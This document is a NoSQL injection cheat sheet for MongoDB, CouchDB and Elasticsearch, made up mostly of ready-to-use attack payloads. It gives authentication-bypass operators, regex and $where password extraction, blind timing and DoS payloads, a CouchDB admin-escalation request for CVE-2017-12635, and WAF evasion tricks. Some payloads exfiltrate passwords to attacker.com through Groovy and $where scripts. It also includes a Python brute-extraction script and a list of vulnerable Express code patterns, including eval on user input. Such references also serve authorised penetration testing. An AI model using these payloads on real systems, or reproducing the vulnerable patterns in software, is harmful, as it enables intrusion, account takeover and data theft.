# NoSQL Injection Payloads

Quick reference for MongoDB, CouchDB, Elasticsearch.

---

## Detection

```javascript
// JSON injection
{"$gt": ""}
{"$ne": null}
{"$ne": 1}
{"$exists": true}

// URL params
username[$ne]=x&password[$ne]=x
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

---

## MongoDB Operators

```javascript
// Comparison
$eq   - equal
$ne   - not equal
$gt   - greater than
$gte  - greater or equal
$lt   - less than
$lte  - less or equal
$in   - in array
$nin  - not in array

// Logical
$or   - logical OR
$and  - logical AND
$not  - negation
$nor  - NOR

// Element
$exists - field exists
$type   - field type

// Evaluation
$regex  - regex match
$where  - JS expression
$expr   - aggregation expression
```

---

## Auth Bypass

```javascript
// POST JSON body
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$exists": true}, "password": {"$exists": true}}

// URL encoded (GET/POST form)
username[$ne]=&password[$ne]=
username=admin&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=admin&password[$ne]=
username[$exists]=true&password[$exists]=true

// $or bypass
{"$or": [{"username": "admin"}, {"username": "administrator"}], "password": {"$ne": ""}}
{"username": "admin", "$or": [{"password": {"$ne": ""}}, {"password": {"$regex": ".*"}}]}

// $where bypass (if enabled)
{"username": {"$where": "return true"}, "password": {"$ne": ""}}
{"$where": "this.username == 'admin'"}
{"$where": "return this.password.length > 0"}
```

---

## Data Extraction

### $regex Enumeration

```javascript
// Extract password character by character
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}

// Case insensitive
{"username": "admin", "password": {"$regex": "^a", "$options": "i"}}

// Username enumeration
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}

// Extract field length
{"username": "admin", "password": {"$regex": "^.{8}$"}}  // length = 8
```

### $where JavaScript Injection

```javascript
// Boolean extraction
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.charAt(0) == 'a'"}
{"$where": "this.password.substring(0,1) == 'a'"}

// Length check
{"$where": "this.password.length == 8"}

// Time-based blind
{"$where": "if(this.password[0]=='a'){sleep(5000)}"}
{"$where": "this.password[0]=='a' ? sleep(5000) : 0"}

// With function
{"$where": "function(){return this.password[0]=='a'}"}

// DoS / sleep
{"$where": "sleep(5000)"}
{"$where": "(function(){var x=0;while(x<1000000){x++;}return true;})()"}
```

### $gt/$lt Comparison Extraction

```javascript
// Binary search character values
{"username": "admin", "password": {"$gt": "a"}}  // password > "a"?
{"username": "admin", "password": {"$lt": "z"}}  // password < "z"?
{"username": "admin", "password": {"$gt": "m"}}  // narrow down
```

---

## Blind NoSQL Injection

### Boolean-Based

```javascript
// True condition (normal response)
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

// False condition (different response)
{"username": {"$regex": "^xyz"}, "password": {"$ne": ""}}

// Data extraction
{"username": "admin", "password": {"$regex": "^a"}}  // check first char
{"username": "admin", "password": {"$regex": "^[a-m]"}}  // binary search
```

### Time-Based

```javascript
// $where timing
{"$where": "if(this.username=='admin'){sleep(5000);return true;}return false;"}
{"$where": "this.password.match(/^a/) ? sleep(5000) : 0"}

// Heavy computation
{"$where": "var d=new Date();while(new Date()-d<5000){};return true;"}
```

### Error-Based

```javascript
// Trigger type errors
{"username": {"$func": "function(){throw Error(this.password)}"}}
{"$where": "throw this.password"}  // may leak in error message
```

---

## MongoDB Aggregation Injection

```javascript
// Inject into $match stage
{"$match": {"$or": [{"admin": true}, {"$where": "1==1"}]}}

// $lookup injection (SSRF-like)
{"$lookup": {"from": "secret_collection", "localField": "_id", "foreignField": "_id", "as": "leaked"}}

// $out write to collection
{"$out": "pwned"}

// $merge injection
{"$merge": {"into": "public_collection"}}
```

---

## Object Injection (JS/Node.js)

```javascript
// Prototype pollution to NoSQL
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}

// req.body pollution
// POST: {"__proto__": {"$gt": ""}}
// Affects: db.find({password: req.body.password})
```

---

## Node.js/Express Vulnerable Patterns

```javascript
// VULNERABLE: Direct user input in query
app.post('/login', (req, res) => {
  db.collection('users').findOne({
    username: req.body.username,  // ← {"$ne": ""}
    password: req.body.password   // ← {"$ne": ""}
  });
});

// VULNERABLE: qs parser (express default)
// ?username[$ne]=x parses to {username: {"$ne": "x"}}

// VULNERABLE: Unvalidated $where
db.collection('users').find({
  $where: `this.name == '${userInput}'`  // JS injection
});

// VULNERABLE: String concatenation
db.collection('users').find({
  username: eval(`'${userInput}'`)  // RCE
});

// VULNERABLE: MongoDB driver with object
const query = {};
query[req.query.field] = req.query.value;  // arbitrary operator injection
db.find(query);
```

---

## CouchDB

### Auth Bypass

```http
GET /_all_docs HTTP/1.1
GET /_users/_all_docs HTTP/1.1
GET /_config HTTP/1.1
```

### Views Injection

```javascript
// Inject into map function
emit(doc._id, doc);

// Design doc injection
{"_id":"_design/pwned","views":{"all":{"map":"function(doc){emit(doc._id,doc)}"}}}
```

### Mango Query Injection

```javascript
// Selector injection
{"selector": {"$or": [{"password": {"$gt": ""}}, {"admin": true}]}}
{"selector": {"type": "user"}, "fields": ["_id", "password"]}

// CouchDB operators
$lt, $lte, $eq, $ne, $gte, $gt
$exists, $type, $in, $nin, $size
$or, $and, $not, $nor, $all
$regex, $mod
```

### Erlang Injection (CVE-2017-12635/12636)

```http
PUT /_users/org.couchdb.user:attacker HTTP/1.1
Content-Type: application/json

{
  "_id": "org.couchdb.user:attacker",
  "name": "attacker",
  "type": "user",
  "roles": [],
  "roles": ["_admin"],
  "password": "password"
}
```

---

## Elasticsearch

### Query DSL Injection

```json
// Inject into bool query
{"query": {"bool": {"should": [{"match_all": {}}]}}}

// Wildcard injection
{"query": {"wildcard": {"password": "*"}}}

// Script injection (if enabled)
{"query": {"script": {"script": "doc['password'].value"}}}

// Lucene query string injection
{"query": {"query_string": {"query": "* OR password:*"}}}
```

### SSRF via Scripting

```json
// Groovy script (older versions)
{"script": {"script": "java.net.URL('http://attacker.com/'+doc['password'].value).text"}}

// Painless script
{"script": {"source": "doc['secret'].value", "lang": "painless"}}
```

### Index Manipulation

```http
// List all indices
GET /_cat/indices?v

// Dump all docs
GET /_search?q=*&size=10000
GET /index_name/_search?q=*

// Get mappings (schema)
GET /_mapping
GET /index_name/_mapping
```

### Common Endpoints

```http
GET /_cluster/health
GET /_cat/nodes?v
GET /_cat/indices?v
GET /_all/_search?q=*
GET /_search?pretty
GET /index/_doc/id
POST /_search {"query":{"match_all":{}}}
```

---

## SSRF via MongoDB

```javascript
// BSON Binary with HTTP
{"$where": "var http=new XMLHttpRequest();http.open('GET','http://attacker.com/'+this.password,false);http.send();"}

// MongoDB Wire Protocol (internal)
// Connect to other MongoDB instances
```

---

## Tools

```bash
# NoSQLMap
python nosqlmap.py -u "http://target.com/login" --data "username=admin&password=test"

# Nuclei templates
nuclei -u "http://target.com" -t nosqli-*.yaml

# Manual with curl
curl -X POST "http://target.com/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# URL encoded
curl "http://target.com/login?username[\$ne]=&password[\$ne]="

# Burp Suite payloads
# Use param miner + intruder with NoSQL operators
```

### Extraction Script

```python
import requests
import string

url = "http://target.com/login"
chars = string.ascii_lowercase + string.digits
password = ""

while True:
    found = False
    for c in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}"}
        }
        r = requests.post(url, json=payload)
        if "success" in r.text:  # adjust condition
            password += c
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

## WAF Bypass

```javascript
// Unicode encoding
{"\u0024ne": ""}
{"\u0024gt": ""}
{"\u0024regex": ".*"}

// Mixed case (some parsers)
{"$NE": ""}
{"$Ne": ""}

// Nested operators
{"username": {"$not": {"$eq": "invalid"}}}

// $expr instead of $where
{"$expr": {"$eq": [{"$substr": ["$password", 0, 1]}, "a"]}}

// Alternative regex syntax
{"password": {"$regex": "(?i)^admin"}}
{"password": /^admin/i}  // (if JS context)
```

---

## Checklist

1. Test operators: `$ne`, `$gt`, `$regex`, `$exists`
2. Check both JSON body and URL params
3. Try `$where` for JS execution
4. Enumerate with `$regex` character-by-character
5. Check for prototype pollution
6. Test aggregation pipeline injection
7. Look for CouchDB/Elasticsearch endpoints
8. Verify error messages for data leakage

---

!!! tip "Quick Test"
    `{"$ne":""}` in any field → if behavior changes, likely injectable

---
*Use [NoSQLMap](https://github.com/codingo/NoSQLMap) for automated exploitation.*
